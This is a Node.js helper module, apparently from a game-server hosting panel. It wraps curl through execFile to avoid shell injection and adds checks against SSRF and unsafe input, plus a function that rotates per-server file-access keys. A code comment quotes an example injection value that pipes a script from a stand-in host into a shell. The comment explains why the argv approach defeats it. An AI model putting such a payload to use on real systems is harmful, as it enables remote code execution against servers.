const { exec, execFile } = require("child_process");
const { promisify } = require("util");
const execPromise = promisify(exec);
const fs = require("fs");
const { ref } = require("process");
const crypto = require("crypto");

// ---------------------------------------------------------------------------
// Shell-injection-safe process execution.
//
// Every RCE found in the panel's security review came from the same root
// cause: building a shell command by concatenating a template string with
// unsanitized input, then running it through exec()/spawn(..., {shell:true}).
// A shell string is parsed for ;, &&, |, `, $(), quotes, etc. no matter how
// the string was assembled - there is no way to "escape" your way to safety
// that isn't itself a bug waiting to happen.
//
// execFile() (and spawn() without {shell:true}) never invoke a shell at all -
// the command and each argument are passed straight to the OS as an argv
// array. This means an argument's *content* is irrelevant to injection risk;
// a value like `"; curl evil.tld | sh #` is just a literal string, not a
// vector, because there's no shell parser around to reinterpret it. That's
// what every helper below is built on. Prefer these over exec()/child_process
// directly for anything touching a URL, header value, or user-controlled
// string.
// ---------------------------------------------------------------------------

function execFileAsync(file, args = [], options = {}) {
  return new Promise((resolve, reject) => {
    execFile(file, args, options, (error, stdout, stderr) => {
      if (error) {
        error.stdout = stdout;
        error.stderr = stderr;
        return reject(error);
      }
      resolve({ stdout, stderr });
    });
  });
}

// Runs curl with an explicit argv array - no shell, so nothing in `args` can
// break out into a second command regardless of its content.
function curl(args, options = {}) {
  return execFileAsync("curl", args, options);
}

function headerArgs(headers = {}) {
  const args = [];
  for (const [key, value] of Object.entries(headers)) {
    args.push("-H", `${key}: ${value}`);
  }
  return args;
}

// GET a URL and parse the response as JSON. Used for the CurseForge/DeepL-style
// "curl an API and parse stdout" calls that used to build the whole request as
// one interpolated shell string.
async function curlGetJSON(url, headers = {}, options = {}) {
  const { stdout } = await curl(
    ["-sS", "-X", "GET", url, ...headerArgs(headers)],
    options
  );
  return JSON.parse(stdout);
}

// POST a JSON body and parse the (optional) JSON response.
async function curlPostJSON(url, headers = {}, jsonBody, options = {}) {
  const args = ["-sS", "-X", "POST", url, ...headerArgs(headers)];
  if (jsonBody !== undefined) {
    args.push("-H", "Content-Type: application/json", "--data", JSON.stringify(jsonBody));
  }
  const { stdout } = await curl(args, options);
  return stdout ? JSON.parse(stdout) : null;
}

async function curlDeleteJSON(url, headers = {}, options = {}) {
  const { stdout } = await curl(
    ["-sS", "-X", "DELETE", url, ...headerArgs(headers)],
    options
  );
  return stdout ? JSON.parse(stdout) : null;
}

// Downloads a URL straight to disk. destPath and url are passed as discrete
// argv entries, so this is safe to call with a fully attacker-controlled URL
// as far as command injection goes - pair it with isAllowedURL() to also
// guard against SSRF (the URL still gets fetched from this host).
function curlDownloadFile(url, destPath, options = {}) {
  const { failOnError = true, maxTimeSec, extraArgs = [], ...execOptions } = options;
  const args = ["-sS", "-L", "-o", destPath, ...extraArgs];
  if (failOnError) args.push("--fail");
  if (maxTimeSec) args.push("--max-time", String(maxTimeSec));
  args.push(url);
  return curl(args, execOptions);
}

// SSRF guard: only allow http(s) URLs whose hostname is (or is a subdomain
// of) one of the known-good hosts a feature is meant to talk to. Use this
// before fetching any URL a customer supplies (modpack archives, plugin
// downloads) - it stops the panel from being used to reach internal
// services, cloud metadata endpoints, or arbitrary third-party hosts.
function isAllowedURL(url, allowedHosts) {
  let parsed;
  try {
    parsed = new URL(url);
  } catch (e) {
    return false;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return false;
  const host = parsed.hostname.toLowerCase();
  return allowedHosts.some((allowed) => {
    const a = allowed.toLowerCase();
    return host === a || host.endsWith("." + a);
  });
}

// Startup flags are a free-form string of JVM args that ends up embedded in a
// shell:true spawn line (docker run ... java <flags> ...) because the java
// command line itself can't be cleanly argv-ified without breaking the
// per-loader launch logic. Since the shell is unavoidable there, the flags
// are instead restricted to a charset that has no shell meaning at all -
// letters, digits, and the punctuation real JVM flags actually use. Anything
// else (;, &, |, `, $, (, ), <, >, quotes, newlines, ...) is rejected outright
// rather than escaped.
const SAFE_STARTUP_FLAGS_PATTERN = /^[A-Za-z0-9 _\-.:=,\/@]*$/;
function isSafeStartupFlags(flags) {
  return (
    typeof flags === "string" &&
    flags.length <= 4000 &&
    SAFE_STARTUP_FLAGS_PATTERN.test(flags)
  );
}

// Strict DNS label validation (RFC 1035): used for subdomain claims, which
// get embedded in both a DNS record name and a Cloudflare API JSON body.
const DNS_LABEL_PATTERN = /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/i;
function isSafeDnsLabel(label) {
  return typeof label === "string" && DNS_LABEL_PATTERN.test(label);
}

// Server/account ids are always supposed to be plain integers. Enforcing
// that before an id is interpolated into a shell command (find, du, rm -rf)
// turns "trust the caller already validated ownership" into a hard
// guarantee that the string can't carry shell metacharacters, independent of
// whatever access checks ran upstream.
function assertNumericId(id, fieldName = "id") {
  const str = String(id);
  if (!/^[0-9]+$/.test(str)) {
    throw new Error(`Invalid ${fieldName}: must be a positive integer`);
  }
  return str;
}

// Collapses a user-supplied name down to a safe filename component: no path
// separators, no shell metacharacters, no null bytes - just the charset
// mod/plugin filenames actually need. Used wherever request input ends up as
// (part of) a filename on disk.
function sanitizeFilenameComponent(name, fallback = "file") {
  if (typeof name !== "string" || name.length === 0) return fallback;
  const cleaned = name.replace(/[^A-Za-z0-9._-]/g, "_").replace(/^\.+/, "");
  return cleaned.length ? cleaned.slice(0, 200) : fallback;
}

let fileAccessKeys = [];
let serversFolder = fs.readdirSync("./servers");

refreshKeys();
function cycle() {
  refreshKeys();

}

function refreshKeys() {
  fileAccessKeys = [];
  serversFolder = fs.readdirSync("./servers");
  for (let i = 0; i < serversFolder.length; i++) {
    if (!isNaN(serversFolder[i])) {
      fileAccessKeys.push({
        serverId: serversFolder[i],
        key: crypto.randomBytes(16).toString("hex"),
      });
    }
  }
}

//get the time and make it so it backs up every day at 12am, 6am, 12pm and 6pm uTC
function scheduleCycleAtUTC(hoursArray) {
  const now = new Date();
  const nowUTC = new Date(
    Date.UTC(
      now.getUTCFullYear(),
      now.getUTCMonth(),
      now.getUTCDate(),
      now.getUTCHours(),
      now.getUTCMinutes(),
      now.getUTCSeconds(),
      now.getUTCMilliseconds()
    )
  );

  const nextTimes = hoursArray.map((h) => {
    const target = new Date(
      Date.UTC(
        now.getUTCFullYear(),
        now.getUTCMonth(),
        now.getUTCDate(),
        h,
        0,
        0,
        0
      )
    );
    if (target <= nowUTC) {
      target.setUTCDate(target.getUTCDate() + 1); // next day
    }
    return target - nowUTC;
  });

  const millisTillNext = Math.min(...nextTimes);


  setTimeout(() => {
    cycle();
    setInterval(cycle, 6 * 60 * 60 * 1000); // every 6 hours
  }, millisTillNext);
}

scheduleCycleAtUTC([0, 6, 12, 18]);


function getFileAccessKey(serverId) {
  return fileAccessKeys.find((key) => key.serverId == serverId).key;
}

// Adds a key for a server created (or restored) after the last refreshKeys(),
// without rotating everyone else's keys. getFileAccessKey throws otherwise.
function ensureKey(serverId) {
  if (!fileAccessKeys.find((key) => key.serverId == serverId)) {
    fileAccessKeys.push({
      serverId: String(serverId),
      key: crypto.randomBytes(16).toString("hex"),
    });
  }
}

module.exports = {
  getFileAccessKey,
  refreshKeys,
  ensureKey,
  execFileAsync,
  curl,
  curlGetJSON,
  curlPostJSON,
  curlDeleteJSON,
  curlDownloadFile,
  isAllowedURL,
  isSafeStartupFlags,
  isSafeDnsLabel,
  assertNumericId,
  sanitizeFilenameComponent,
};
